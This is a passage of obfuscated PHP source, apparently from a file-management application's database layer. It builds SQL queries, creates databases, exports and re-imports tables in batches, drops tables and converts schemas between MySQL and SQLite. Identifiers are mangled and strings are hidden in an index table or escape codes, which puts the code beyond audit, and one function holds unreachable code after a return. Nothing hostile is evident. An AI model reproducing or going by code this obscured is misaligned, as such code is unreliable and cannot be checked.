? $ ı—é•‘ : 1; $“Ò¼½ûµ = isset($“Ò¼½ûµ) ? $“Ò¼½ûµ : (is_numeric($•ú—¹¨˜[$Èá¤éÆ[370]]) ? $•ú—¹¨˜[$Èá¤éÆ[370]] : 20); $Î×ŠœÂ = $“Ò¼½ûµ * ((int) $ ı—é•‘ - 1); $•ú—¹¨˜[$Èá¤éÆ[370]] = $Î×ŠœÂ . $Èá¤éÆ[50] . $“Ò¼½ûµ; } if (think_config($Èá¤éÆ[1144])) { $•ŞøØ ¬ = $Èá¤éÆ[1145] . md5(serialize($•ú—¹¨˜)); $ô—şÚ¦Ú = think_cache($•ŞøØ ¬); if ($ô—şÚ¦Ú) { return $ô—şÚ¦Ú; } } $»ÍÃÈ¡Å = $this->parseSql($this->selectSql, $•ú—¹¨˜); $»ÍÃÈ¡Å .= $this->parseLock(isset($•ú—¹¨˜[$Èá¤éÆ[944]]) ? $•ú—¹¨˜[$Èá¤éÆ[944]] : !1); if (isset($•ŞøØ ¬)) { think_cache($•ŞøØ ¬, $»ÍÃÈ¡Å); } return $»ÍÃÈ¡Å; } public function parseSql($ó€µ•ôË, $ÊÉÙÂÌŞ = array()) { $å„âÖüË =& $_SERVER[ÅÄÇĞô]; $ó€µ•ôË = str_replace(array($å„âÖüË[1146], $å„âÖüË[1147], $å„âÖüË[1148], $å„âÖüË[1149], $å„âÖüË[1150], $å„âÖüË[1151], $å„âÖüË[1152], $å„âÖüË[1153], $å„âÖüË[1154], $å„âÖüË[1155], $å„âÖüË[1156]), array($this->parseTable("{$ÊÉÙÂÌŞ[$å„âÖüË[359]]}"), $this->parseDistinct(isset($ÊÉÙÂÌŞ[$å„âÖüË[1157]]) ? $ÊÉÙÂÌŞ[$å„âÖüË[1157]] : !1), $this->parseField(!empty($ÊÉÙÂÌŞ[$å„âÖüË[353]]) ? $ÊÉÙÂÌŞ[$å„âÖüË[353]] : $å„âÖüË[223]), $this->parseJoin(!empty($ÊÉÙÂÌŞ[$å„âÖüË[362]]) ? $ÊÉÙÂÌŞ[$å„âÖüË[362]] : $å„âÖüË[12]), $this->parseWhere(!empty($ÊÉÙÂÌŞ[$å„âÖüË[355]]) ? $ÊÉÙÂÌŞ[$å„âÖüË[355]] : $å„âÖüË[12]), $this->parseGroup(!empty($ÊÉÙÂÌŞ[$å„âÖüË[583]]) ? $ÊÉÙÂÌŞ[$å„âÖüË[583]] : $å„âÖüË[12]), $this->parseHaving(!empty($ÊÉÙÂÌŞ[$å„âÖüË[1158]]) ? $ÊÉÙÂÌŞ[$å„âÖüË[1158]] : $å„âÖüË[12]), $this->parseOrder(!empty($ÊÉÙÂÌŞ[$å„âÖüË[444]]) ? $ÊÉÙÂÌŞ[$å„âÖüË[444]] : $å„âÖüË[12]), $this->parseLimit(!empty($ÊÉÙÂÌŞ[$å„âÖüË[370]]) ? $ÊÉÙÂÌŞ[$å„âÖüË[370]] : $å„âÖüË[12]), $this->parseUnion(!empty($ÊÉÙÂÌŞ[$å„âÖüË[425]]) ? $ÊÉÙÂÌŞ[$å„âÖüË[425]] : $å„âÖüË[12]), $this->parseComment(!empty($ÊÉÙÂÌŞ[$å„âÖüË[432]]) ? $ÊÉÙÂÌŞ[$å„âÖüË[432]] : $å„âÖüË[12])), $ó€µ•ôË); return $ó€µ•ôË; } public function getLastSql($Ê¸—½İê = '') { return $Ê¸—½İê ? $this->modelSql[$Ê¸—½İê] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¸šŒÃ°¿) { return addslashes($¸šŒÃ°¿); } public function setModel($„·÷Áğô) { $this->model = $„·÷Áğô; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ëÂ£°—Ğ = array()) { $†…”ˆÏ¡ =& $_SERVER[ÅÄÇĞô]; if (empty($ëÂ£°—Ğ)) { $ëÂ£°—Ğ = $GLOBALS[$†…”ˆÏ¡[6]][$†…”ˆÏ¡[21]]; } $this->database = $ëÂ£°—Ğ; } public function model($Œ”ËÌÈ† = '') { return new ModelBase($Œ”ËÌÈ†, $_SERVER[ÅÄÇĞô][12], $this->database); } public function db($ºØì¨Íò = false) { $Æ‰§ªÀÂ =& $_SERVER[ÅÄÇĞô]; $´õƒ½‹Ş = array_change_key_case($this->database); if ($this->dbType() == $Æ‰§ªÀÂ[13] || !$ºØì¨Íò) { return $this->model()->db(); } $¾ÎõæˆÉ = $´õƒ½‹Ş[$Æ‰§ªÀÂ[1072]]; $´õƒ½‹Ş[$Æ‰§ªÀÂ[1072]] = $Æ‰§ªÀÂ[12]; if ($´õƒ½‹Ş[$Æ‰§ªÀÂ[1067]] == $Æ‰§ªÀÂ[1064]) { $é‘Èßü = $´õƒ½‹Ş[$Æ‰§ªÀÂ[1073]]; $´õƒ½‹Ş[$Æ‰§ªÀÂ[1073]] = substr($é‘Èßü, 0, strrpos($é‘Èßü, $Æ‰§ªÀÂ[1159])); } $this->database = $´õƒ½‹Ş; $ˆ§µ“‘µ = $this->model()->db(); try { $ÁƒÅ¶‚ = $ˆ§µ“‘µ->execute("\163\150\157\167\x20\144\141\x74\x61\x62\141\x73\145\163\40\154\151\153\145\x20\47{$¾ÎõæˆÉ}\x27"); } catch (Exception $™¿²÷åÎ) { } if (!$ÁƒÅ¶‚) { $ˆ§µ“‘µ->execute("\x63\162\145\141\x74\x65\x20\144\141\164\x61\x62\141\x73\145\x20\x60{$¾ÎõæˆÉ}\x60"); } $´õƒ½‹Ş[$Æ‰§ªÀÂ[1072]] = $¾ÎõæˆÉ; if ($´õƒ½‹Ş[$Æ‰§ªÀÂ[1067]] == $Æ‰§ªÀÂ[1064]) { $´õƒ½‹Ş[$Æ‰§ªÀÂ[1073]] .= $Æ‰§ªÀÂ[1159] . $¾ÎõæˆÉ; } $this->database = $´õƒ½‹Ş; $ˆ§µ“‘µ->execute("\x75\x73\145\x20\140{$¾ÎõæˆÉ}\x60"); return $ˆ§µ“‘µ; } public function createTable($Ï¸ëö¾±, &$Íî‹¸˜ˆ) { $õú˜’Œ‰ =& $_SERVER[ÅÄÇĞô]; if (!IO::exist($Ï¸ëö¾±)) { ActionCall($õú˜’Œ‰[1160], !0, 0); show_json(LNG($õú˜’Œ‰[1161]), !1); } $ìû‚ = $this->model()->db(); $åáÏ±ŠÓ = sqlSplit(IO::getContent($Ï¸ëö¾±)); foreach ($åáÏ±ŠÓ as $€áØ†é) { $æƒ¾Ÿƒ¿ = stripos($€áØ†é, $õú˜’Œ‰[1162]) === 0; if ($æƒ¾Ÿƒ¿) { $Íî‹¸˜ˆ->task[$õú˜’Œ‰[1163]] += 1; } $ìû‚->execute($€áØ†é); if ($æƒ¾Ÿƒ¿) { preg_match($õú˜’Œ‰[1164], $€áØ†é, $ø§€ÎŸÔ); $Íî‹¸˜ˆ->task[$õú˜’Œ‰[1165]] = $ø§€ÎŸÔ[1]; $Íî‹¸˜ˆ->update(1); } } } public function insertTable($‡Ô°œ, &$ß¢†ıÖ€) { $³à½®Ø =& $_SERVER[ÅÄÇĞô]; $ùÊÚéú‘ = $this->model()->db(); $¸ƒ¼Û·é = $ú·‰ä¾± ? array($ú·‰ä¾±) : $ùÊÚéú‘->getTables(); foreach ($‡Ô°œ as $Ş íÚãû) { $ú·‰ä¾± = basename($Ş íÚãû, $³à½®Ø[885]); if (!in_array($ú·‰ä¾±, $¸ƒ¼Û·é)) { continue; } $ß¢†ıÖ€->task[$³à½®Ø[1165]] = $ú·‰ä¾±; if (get_filesize($Ş íÚãû) == 0) { continue; } $óøÕÖØå = $this->sqlToDb($Ş íÚãû, $ß¢†ıÖ€); if (!$óøÕÖØå) { ActionCall($³à½®Ø[1160], !0, 0); show_json(LNG($³à½®Ø[1166]) . "\133{$ú·‰ä¾±}\135", !1); } } } public function sqlFromDb($¦ø½ß‘, $‹Ğ™æœ, &$Å‰•ğã„, $ª°®îšˆ = '') { if ($Å‰•ğã„) { $Å‰•ğã„->task[$_SERVER[ÅÄÇĞô][1165]] = $¦ø½ß‘; } $ØÍÏŠü® = $this->model($¦ø½ß‘); $¿§Û½ÒÍ = 0; $ğ‘²²¼è = 0; $÷²ÕĞ“¥ = 10000; $½³ä´«² = fopen($‹Ğ™æœ, $_SERVER[ÅÄÇĞô][1167]); $ëÊ–®² = $ØÍÏŠü®->getPk(); $…ì¼œ”ò = $ØÍÏŠü®->getDbFields(); $ÇÇ­àêª = $_SERVER[ÅÄÇĞô][12]; if ($GLOBALS[$_SERVER[ÅÄÇĞô][884]] && in_array($¦ø½ß‘, array($_SERVER[ÅÄÇĞô][1168], $_SERVER[ÅÄÇĞô][1169]))) { $ÇÇ­àêª = $¦ø½ß‘; } do { $ºéŞÁÔÈ = array($ëÊ–®² => array($_SERVER[ÅÄÇĞô][1114], $ğ‘²²¼è)); $íÅ‹†ÊÇ = $ØÍÏŠü®->where($ºéŞÁÔÈ)->field($…ì¼œ”ò)->order($ëÊ–®² . $_SERVER[ÅÄÇĞô][1170])->limit($÷²ÕĞ“¥)->select(); $íÅ‹†ÊÇ = !empty($íÅ‹†ÊÇ) ? $íÅ‹†ÊÇ : array(); if (!($§¹ƒ¬Åò = count($íÅ‹†ÊÇ))) { break; } $ê›úÆ¡Ë = end($íÅ‹†ÊÇ); $ğ‘²²¼è = $ê›úÆ¡Ë[$ëÊ–®²]; $ÙòŸî¸Š = array(); foreach ($íÅ‹†ÊÇ as $±½­ûşÓ) { if ($ÇÇ­àêª) { if ($¦ø½ß‘ == $_SERVER[ÅÄÇĞô][1168]) { if ($±½­ûşÓ[$_SERVER[ÅÄÇĞô][33]] == $_SERVER[ÅÄÇĞô][1171]) { $Ïè„Í¢„ = json_decode($±½­ûşÓ[$_SERVER[ÅÄÇĞô][453]], !0); if ($Ïè„Í¢„[$_SERVER[ÅÄÇĞô][32]] == $GLOBALS[$_SERVER[ÅÄÇĞô][884]] && $Ïè„Í¢„[$_SERVER[ÅÄÇĞô][845]] != 1) { continue; } } } else { if ($±½­ûşÓ[$_SERVER[ÅÄÇĞô][33]] == $_SERVER[ÅÄÇĞô][1172] && $±½­ûşÓ[$_SERVER[ÅÄÇĞô][97]] == $_SERVER[ÅÄÇĞô][880]) { continue; } } } if ($ª°®îšˆ) { $±½­ûşÓ[$_SERVER[ÅÄÇĞô][87]] = "\x7b\151\157\72{$ª°®îšˆ}\175" . substr($±½­ûşÓ[$_SERVER[ÅÄÇĞô][87]], strlen("\173\x69\157\x3a{$±½­ûşÓ[$_SERVER[ÅÄÇĞô][918]]}\175")); $±½­ûşÓ[$_SERVER[ÅÄÇĞô][918]] = $ª°®îšˆ; } $ÙòŸî¸Š[] = $_SERVER[ÅÄÇĞô][1173] . $this->sqlEncode($±½­ûşÓ) . $_SERVER[ÅÄÇĞô][1174]; } $Í¦·Èï = "\x49\x4e\x53\x45\x52\124\40\111\116\x54\117\40\140{$¦ø½ß‘}\x60\x20\x28\x60" . implode($_SERVER[ÅÄÇĞô][1175], $…ì¼œ”ò) . $_SERVER[ÅÄÇĞô][1176]; fwrite($½³ä´«², $Í¦·Èï . implode($_SERVER[ÅÄÇĞô][1177], $ÙòŸî¸Š) . $_SERVER[ÅÄÇĞô][74] . PHP_EOL); $¿§Û½ÒÍ += $§¹ƒ¬Åò; if ($Å‰•ğã„) { $Å‰•ğã„->update($§¹ƒ¬Åò); } } while ($÷²ÕĞ“¥ == $§¹ƒ¬Åò); fclose($½³ä´«²); return $¿§Û½ÒÍ; } public function sqlToDb($—Ø¡ìü‚, &$âÄµñ€ô) { $–Âø­à =& $_SERVER[ÅÄÇĞô]; $àÃçù³± = $this->model()->db(); $•ÄšóŸ½ = @fopen($—Ø¡ìü‚, $–Âø­à[1178]); if (!$•ÄšóŸ½) { return !1; } $©„ƒß¯€ = 0; $İ¼·Ôèò = $–Âø­à[12]; $ÚÖÅûºä = array(); $İƒËƒ©Š = $this->dbType(); $ÊŸÅ®›‰ = $İƒËƒ©Š == $–Âø­à[13] ? 500 : 2000; $ş¥Æ§¢ = basename($—Ø¡ìü‚, $–Âø­à[885]); $·«â¹Ú = 0; $¾¸»ËŒê = 4194304; while (!feof($•ÄšóŸ½)) { $…© œ = trim(fgets($•ÄšóŸ½)); if (!$…© œ) { continue; } $ù–¡ªÕç = $this->sqlDecode($…© œ, $İƒËƒ©Š, $ş¥Æ§¢); if (stripos($ù–¡ªÕç, $–Âø­à[433]) === 0) { if (!$İ¼·Ôèò) { $İ¼·Ôèò = $ù–¡ªÕç . $–Âø­à[53]; } continue; } if ($âÄµñ€ô) { $âÄµñ€ô->task[$–Âø­à[1163]] += 1; } $©„ƒß¯€++; $ÚÖÅûºä[] = rtrim(rtrim(trim($ù–¡ªÕç), $–Âø­à[50]), $–Âø­à[74]); $ëıé´¢… = null; $˜çØä‘ = strlen($ù–¡ªÕç); $·«â¹Ú += $˜çØä‘; $×ÎˆÏ¶ = strlen($İ¼·Ôèò) + $·«â¹Ú + (count($ÚÖÅûºä) - 1); if ($×ÎˆÏ¶ >= $¾¸»ËŒê) { $ëıé´¢… = array_pop($ÚÖÅûºä); if ($©„ƒß¯€ > 1) { $©„ƒß¯€--; } } if ($©„ƒß¯€ >= $ÊŸÅ®›‰ || $ëıé´¢…) { $ù–¡ªÕç = $İ¼·Ôèò . implode($–Âø­à[50], $ÚÖÅûºä); if (!$àÃçù³±->execute($ù–¡ªÕç)) { return !1; } if ($âÄµñ€ô) { $âÄµñ€ô->update($©„ƒß¯€); } $ÚÖÅûºä = array(); $©„ƒß¯€ = 0; $·«â¹Ú = 0; if ($ëıé´¢…) { $ÚÖÅûºä = array($ëıé´¢…); $©„ƒß¯€ = 1; $·«â¹Ú = $˜çØä‘; } } } fclose($•ÄšóŸ½); if (!empty($ÚÖÅûºä)) { $ù–¡ªÕç = $İ¼·Ôèò . implode($–Âø­à[50], $ÚÖÅûºä); if (!$àÃçù³±->execute($ù–¡ªÕç)) { return !1; } if ($âÄµñ€ô) { $âÄµñ€ô->update($©„ƒß¯€); } } return !0; } public function dropTable($Û–ƒ•œı = null) { $¸±ãŸ˜ = $this->model()->db(); $ÛªìæÉ = $Û–ƒ•œı ? array($Û–ƒ•œı) : $¸±ãŸ˜->getTables(); if (!$ÛªìæÉ) { return; } foreach ($ÛªìæÉ as $Û–ƒ•œı) { if ($Û–ƒ•œı) { $Û–ƒ•œı = strtolower($Û–ƒ•œı); } else { continue; } $¸±ãŸ˜->execute("\144\162\157\160\40\x74\141\x62\154\145\40\x69\x66\x20\x65\170\151\163\x74\163\40\140{$Û–ƒ•œı}\x60"); } } private function sqlEncode($Õ£¯ÙÃœ) { $ğĞ½³µ± =& $_SERVER[ÅÄÇĞô]; $œø§¿é = array(); foreach ($Õ£¯ÙÃœ as $ùÖõàÆ) { if (is_array($ùÖõàÆ)) { $ùÖõàÆ = json_encode_force($ùÖõàÆ); } $ùÖõàÆ = addslashes($ùÖõàÆ); $ùÖõàÆ = str_replace(array($ğĞ½³µ±[1179], $ğĞ½³µ±[288], $ğĞ½³µ±[420]), array($ğĞ½³µ±[1180], $ğĞ½³µ±[1181], $ğĞ½³µ±[1182]), $ùÖõàÆ); $œø§¿é[] = $ùÖõàÆ; } return $ğĞ½³µ±[58] . implode($ğĞ½³µ±[1183], $œø§¿é) . $ğĞ½³µ±[58]; } private function sqlDecode($¿§«€çÇ, $Èñ¹éø, $•‹Æ’°ˆ = '') { $šØ’ù†œ =& $_SERVER[ÅÄÇĞô]; $¿§«€çÇ = str_replace(array($šØ’ù†œ[1180], $šØ’ù†œ[1181], $šØ’ù†œ[1182]), array($šØ’ù†œ[1179], $šØ’ù†œ[288], $šØ’ù†œ[420]), $¿§«€çÇ); if ($Èñ¹éø == $šØ’ù†œ[13]) { $¿§«€çÇ = str_ireplace($šØ’ù†œ[1184], $šØ’ù†œ[59], $¿§«€çÇ); $¿§«€çÇ = stripslashes($¿§«€çÇ); } return preg_replace($šØ’ù†œ[1185], $šØ’ù†œ[12], $¿§«€çÇ); if ($Èñ¹éø == $šØ’ù†œ[13]) { return $•‹Æ’°ˆ != $šØ’ù†œ[879] ? stripslashes($¿§«€çÇ) : $¿§«€çÇ; } if ($•‹Æ’°ˆ == $šØ’ù†œ[879]) { $¿§«€çÇ = str_replace($šØ’ù†œ[1186], $šØ’ù†œ[121], stripslashes($¿§«€çÇ)); } return $¿§«€çÇ; } public function getSqlFile($ÙèÁ®ÒÏ = '') { $âáÈº›° =& $_SERVER[ÅÄÇĞô]; $ï×µËÁ¡ = $this->dbType(!0); $†Õ–¶û¾ = CONTROLLER_DIR . "\x69\x6e\x73\x74\141\x6c\154\x2f\144\141\x74\x61\57{$ï×µËÁ¡}\x2e\163\161\x6c"; $°ŞÆ·ó¶ = file_get_contents($†Õ–¶û¾); $•çªè¬ = $âáÈº›°[1187] . ($ï×µËÁ¡ == $âáÈº›°[903] ? $âáÈº›°[1188] : $âáÈº›°[1189]) . $âáÈº›°[1190]; preg_match_all($•çªè¬, $°ŞÆ·ó¶, $…ÎéŠ†); $ÌŒ¶Î©É = $…ÎéŠ†[1]; $Êİ™°Óˆ = $this->model()->db(); $ĞÙÑä´ = $Êİ™°Óˆ->getTables(); $Â¦ÅÒú½ = TEMP_FILES . $âáÈº›°[1191] . date($âáÈº›°[262]) . $âáÈº›°[8]; del_dir($Â¦ÅÒú½); mk_dir($Â¦ÅÒú½); $Â³Á¦é® = $Â¦ÅÒú½ . $âáÈº›°[1192]; $ø…•“Ş´ = $Â¦ÅÒú½ . $âáÈº›°[1193]; $ø¸ÃìÑÖ = $ï×µËÁ¡ == $âáÈº›°[13] ? $âáÈº›°[903] : $âáÈº›°[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\154\x6c\x2f\x64\x61\x74\141\57{$ø¸ÃìÑÖ}\56\163\x71\x6c", $Â¦ÅÒú½); @touch($Â¦ÅÒú½ . $ï×µËÁ¡ . $âáÈº›°[885]); $¹š£ÙÎÏ = fopen($Â³Á¦é®, $âáÈº›°[1167]); $¶¼‹‚…ş = fopen($ø…•“Ş´, $âáÈº›°[1167]); if ($ï×µËÁ¡ == $âáÈº›°[13]) { $ĞÙÑä´ = array_diff($ĞÙÑä´, array($âáÈº›°[877], $âáÈº›°[878])); $šÁŸ¬Á = array($âáÈº›°[1194], $âáÈº›°[1195], $âáÈº›°[1196]); fwrite($¶¼‹‚…ş, implode(PHP_EOL, $šÁŸ¬Á) . PHP_EOL . PHP_EOL); foreach ($ĞÙÑä´ as $æ´Ìşó) { $û³Í¾‰ = $this->sqlFromSqlite($æ´Ìşó); if (!$û³Í¾‰[$âáÈº›°[13]]) { continue; } fwrite($¶¼‹‚…ş, $û³Í¾‰[$âáÈº›°[13]] . PHP_EOL . PHP_EOL); if (!in_array($æ´Ìşó, $ÌŒ¶Î©É)) { fwrite($¹š£ÙÎÏ, $û³Í¾‰[$âáÈº›°[903]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ĞÙÑä´ as $æ´Ìşó) { $û³Í¾‰ = $this->sqlFromMysql($æ´Ìşó); if (!$û³Í¾‰[$âáÈº›°[903]]) { continue; } fwrite($¹š£ÙÎÏ, $û³Í¾‰[$âáÈº›°[903]] . PHP_EOL . PHP_EOL); if (!in_array($æ´Ìşó, $ÌŒ¶Î©É)) { fwrite($¶¼‹‚…ş, $û³Í¾‰[$âáÈº›°[13]] . PHP_EOL . PHP_EOL); } } } fclose($¹š£ÙÎÏ); fclose($¶¼‹‚…ş); $°ŞÆ·ó¶ = array($âáÈº›°[903] => $Â³Á¦é®, $âáÈº›°[13] => $ø…•“Ş´); return $ÙèÁ®ÒÏ ? $°ŞÆ·ó¶[$ÙèÁ®ÒÏ] : $°ŞÆ·ó¶; } public function dbType($™­ë„ˆù = false) { $äÖ¨éƒº =& $_SERVER[ÅÄÇĞô]; $ô¢´Şäû = $™­ë„ˆù ? $GLOBALS[$äÖ¨éƒº[6]][$äÖ¨éƒº[21]] : $this->database; $ô¢´Şäû = array_change_key_case($ô¢´Şäû); $Ã”÷ìßö = $ô¢´Şäû[$äÖ¨éƒº[1067]]; if ($Ã”÷ìßö == $äÖ¨éƒº[1064]) { $×¹Ü®„Ü = explode($äÖ¨éƒº[4], $ô¢´Şäû[$äÖ¨éƒº[1073]]); $Ã”÷ìßö = $×¹Ü®„Ü[0]; } $ÀÍˆÓÔ— = array($äÖ¨éƒº[1197] => $äÖ¨éƒº[13], $äÖ¨éƒº[1012] => $äÖ¨éƒº[903]); if (isset($ÀÍˆÓÔ—[$Ã”÷ìßö])) { $Ã”÷ìßö = $ÀÍˆÓÔ—[$Ã”÷ìßö]; } return $Ã”÷ìßö; } public function sqlFromMysql($…•­ÒµÃ, $Ù›§©ŠÍ = '') { $™åóúİú =& $_SERVER[ÅÄÇĞô]; $”À€Ùìå = $this->model()->db(); $¶œñÎº¥ = $”À€Ùìå->query($™åóúİú[1198] . $…•­ÒµÃ . $™åóúİú[464]); if (!$¶œñÎº¥ || !$¶œñÎº¥[0]) { return !1; } $ÃœõòØ = _get($¶œñÎº¥[0], $™åóúİú[1199], $™åóúİú[12]); if (!$ÃœõòØ) { return !1; } $×¤Å·ä = "\104\122\117\x50\x20\x54\101\102\x4c\105\x20\111\106\40\105\x58\111\123\x54\x53\40\140{$…•­ÒµÃ}\140\x3b" . PHP_EOL . $ÃœõòØ . $™åóúİú[74]; if ($Ù›§©ŠÍ && $Ù›§©ŠÍ == $™åóúİú[903]) { return $×¤Å·ä; } $òç¨»é = array_change_key_case($GLOBALS[$™åóúİú[6]][$™åóúİú[21]]); $³ÖÃ·şŠ = $òç¨»é[$™åóúİú[1072]]; $ÓÎ©ÜÕ = $™åóúİú[1200] . $³ÖÃ·şŠ . $™åóúİú[1201] . $…•­ÒµÃ . $™åóúİú[58]; $’´ˆ÷Æ– = $™åóúİú[1202] . $…•­ÒµÃ . $™åóúİú[1000]; $ö®Ù¼ÓÊ = $”À€Ùìå->query($ÓÎ©ÜÕ); if (empty($ö®Ù¼ÓÊ)) { $¿ÓÕ¨§› = array($™åóúİú[903] => $™åóúİú[12], $™åóúİú[13] => $™åóúİú[12]); return $Ù›§©ŠÍ ? $¿ÓÕ¨§›[$Ù›§©ŠÍ] : $¿ÓÕ¨§›; } $Í—ó° = $”À€Ùìå->query($’´ˆ÷Æ–); $å×å˜‘ˆ = $™åóúİú[12]; $ŸÅ¨Ôı = array(); foreach ($Í—ó° as $ÙŒœâÈï) { if (!$å×å˜‘ˆ && $ÙŒœâÈï[$™åóúİú[1203]] == $™åóúİú[1204]) { $å×å˜‘ˆ = $ÙŒœâÈï[$™åóúİú[1205]]; } if (isset($ŸÅ¨Ôı[$ÙŒœâÈï[$™åóúİú[1203]]])) { $ŸÅ¨Ôı[$ÙŒœâÈï[$™åóúİú[1203]]][$™åóúİú[1206]][] = $ÙŒœâÈï[$™åóúİú[1205]]; continue; } $ŸÅ¨Ôı[$ÙŒœâÈï[$™åóúİú[1203]]] = array($™åóúİú[1207] => $ÙŒœâÈï[$™åóúİú[1203]], $™åóúİú[1206] => array($ÙŒœâÈï[$™åóúİú[1205]]), $™åóúİú[1208] => $ÙŒœâÈï[$™åóúİú[1209]] == $™åóúİú[91] ? 0 : 1); } $³Š±ƒî÷ = array(); foreach ($ŸÅ¨Ôı as $ÙŒœâÈï) { $½ÄŞ„©å = $ÙŒœâÈï[$™åóúİú[1207]] == $™åóúİú[1204]; $ëÌ€Ñ = array($™åóúİú[1210], $ÙŒœâÈï[$™åóúİú[1208]] == $™åóúİú[91] && !$½ÄŞ„©å ? $™åóúİú[1211] : $™åóúİú[12], $™åóúİú[1212], $™åóúİú[1213] . $…•­ÒµÃ . $™åóúİú[11] . ($½ÄŞ„©å ? $™åóúİú[1214] : $ÙŒœâÈï[$™åóúİú[1207]]) . $™åóúİú[121], $™åóúİú[1215], $™åóúİú[121] . $…•­ÒµÃ . $™åóúİú[121], $™åóúİú[1216] . implode($™åóúİú[1217], $ÙŒœâÈï[$™åóúİú[1206]]) . $™åóúİú[1218]); $³Š±ƒî÷[] = implode($™åóúİú[53], $ëÌ€Ñ) . $™åóúİú[74]; } $÷§¸óø½ = array(); $‰Õ™ääÏ = array($™åóúİú[1219] => $™åóúİú[1220], $™åóúİú[1220] => $™åóúİú[1220], $™åóúİú[366] => $™åóúİú[393], $™åóúİú[365] => $™åóúİú[393]); foreach ($ö®Ù¼ÓÊ as $ÙŒœâÈï) { $ëÌ€Ñ = array($™åóúİú[121] . $ÙŒœâÈï[$™åóúİú[1221]] . $™åóúİú[121], isset($‰Õ™ääÏ[$ÙŒœâÈï[$™åóúİú[1222]]]) ? $‰Õ™ääÏ[$ÙŒœâÈï[$™åóúİú[1222]]] : $ÙŒœâÈï[$™åóúİú[1223]], $ÙŒœâÈï[$™åóúİú[1224]] == $™åóúİú[998] ? $™åóúİú[1225] : $™åóúİú[1226], $ÙŒœâÈï[$™åóúİú[1221]] == $å×å˜‘ˆ ? $™åóúİú[1227] : $™åóúİú[12], $ÙŒœâÈï[$™åóúİú[1049]] ? strtoupper(str_replace($™åóúİú[11], $™åóúİú[12], $ÙŒœâÈï[$™åóúİú[1049]])) : $™åóúİú[12]); $÷§¸óø½[] = trim(implode($™åóúİú[53], $ëÌ€Ñ)); } $Øû„«¹€ = array($™åóúİú[1228] . $…•­ÒµÃ . $™åóúİú[1229], $™åóúİú[1230] . $…•­ÒµÃ . $™åóúİú[1231], implode($™åóúİú[50] . PHP_EOL, $÷§¸óø½), $™åóúİú[1046]); $´«øÄâÛ = implode(PHP_EOL, array_merge($Øû„«¹€, $³Š±ƒî÷)); if ($Ù›§©ŠÍ && $Ù›§©ŠÍ == $™åóúİú[13]) { return $´«øÄâÛ; } $¿ÓÕ¨§› = array($™åóúİú[903] => $×¤Å·ä, $™åóúİú[13] => $´«øÄâÛ); return $Ù›§©ŠÍ ? $¿ÓÕ¨§›[$Ù›§©ŠÍ] : $¿ÓÕ¨§›; } public function sqlFromSqlite($—ğ©¯, $¶”½Ö‹ = '') { $ú¾‚ø =& $_SERVER[ÅÄÇĞô]; $¶¢şİõ´ = $this->model()->db(); $ºú•“­Ó = "\x50\x52\x41\x47\115\x41\x20\x54\101\102\x4c\x45\137\x49\x4e\x46\117\40\50\47{$—ğ©¯}\x27\x29"; $—Šœ’Ş÷ = "\123\x45\114\105\103\x54\x20\x2a\x20\x46\x52\x4f\115\x20\x73\x71\x6c\151\164\145\x5f\155\x61\163\164\x65\x72\x20\x57\110\105\122\x45\x20\x74\142\x6c\137\156\141\x6d\145\x20\75\x20\47{$—ğ©¯}\47"; $’Õ¾¬şš = $¶¢şİõ´->query($ºú•“­Ó); if (empty($’Õ¾¬şš)) { $µ’Ø¶ç = array($ú¾‚ø[903] => $ú¾‚ø[12], $ú¾‚ø[13] => $ú¾‚ø[12]); return $¶”½Ö‹ ? $µ’Ø¶ç[$¶”½Ö‹] : $µ’Ø¶ç; } $Ú›äÃ¢Â = $¶¢şİõ´->query($—Šœ’Ş÷); $Şíà’¼ = $¥”¶Ùìş = array(); foreach ($Ú›äÃ¢Â as $µËÃ›åŒ) { if ($µËÃ›åŒ[$ú¾‚ø[33]] == $ú¾‚ø[359]) { $Şíà’¼[] = $µËÃ›åŒ[$ú¾‚ø[1232]]; } else { $¥”¶Ùìş[$µËÃ›åŒ[$ú¾‚ø[32]]] = $µËÃ›åŒ[$ú¾‚ø[1232]]; } } $Â¢Î˜ïñ = array_merge(array($ú¾‚ø[1228] . $—ğ©¯ . $ú¾‚ø[121]), $Şíà’¼, array_values($¥”¶Ùìş)); $Â¢Î˜ïñ = implode($ú¾‚ø[74] . PHP_EOL, $Â¢Î˜ïñ) . $ú¾‚ø[74]; if ($¶”½Ö‹ && $¶”½Ö‹ == $ú¾‚ø[13]) { return $Â¢Î˜ïñ; } $…ƒ©ñ…• = array(); foreach ($¥”¶Ùìş as $ÌÀ¯ˆŞ¦ => $åĞ¸¦›) { $¯€àòòÔ = str_replace($ú¾‚ø[1233] . $—ğ©¯ . $ú¾‚ø[11], $ú¾‚ø[12], $ÌÀ¯ˆŞ¦); $¯€àòòÔ = str_replace($—ğ©¯ . $ú¾‚ø[11], $ú¾‚ø[12], $ÌÀ¯ˆŞ¦); $ã´ƒÙúû = str_replace(array($ú¾‚ø[121], $ú¾‚ø[1057]), $ú¾‚ø[464], substr($åĞ¸¦›, stripos($åĞ¸¦›, $ú¾‚ø[340]))); $…ƒ©ñ…•[$¯€àòòÔ] = $ã´ƒÙúû; } $ë¥—™Ä€ = array(); $ê‘÷„° = array($ú¾‚ø[1220] => $ú¾‚ø[1234], $ú¾‚ø[393] => $ú¾‚ø[1235]); $ÜšıÍ—Ú = $œ„Šêúå = $ú¾‚ø[12]; foreach ($’Õ¾¬şš as $µËÃ›åŒ) { if ($µËÃ›åŒ[$ú¾‚ø[57]] == $ú¾‚ø[91]) { $ÜšıÍ—Ú = $µËÃ›åŒ[$ú¾‚ø[32]]; } $ïŠ²á¸÷ = $µËÃ›åŒ[$ú¾‚ø[33]]; if ($ïŠ²á¸÷ == $ú¾‚ø[1236] && isset($…ƒ©ñ…•[$µËÃ›åŒ[$ú¾‚ø[32]]])) { $ïŠ²á¸÷ = $ú¾‚ø[1237]; } $µ ‰Â‡™ = array($ú¾‚ø[464] . $µËÃ›åŒ[$ú¾‚ø[32]] . $ú¾‚ø[464], _get($ê‘÷„°, $ïŠ²á¸÷, $ïŠ²á¸÷), $µËÃ›åŒ[$ú¾‚ø[35]] == $ú¾‚ø[91] ? $ú¾‚ø[1225] : $ú¾‚ø[1238] . $µËÃ›åŒ[$ú¾‚ø[56]], $µËÃ›åŒ[$ú¾‚ø[57]] == 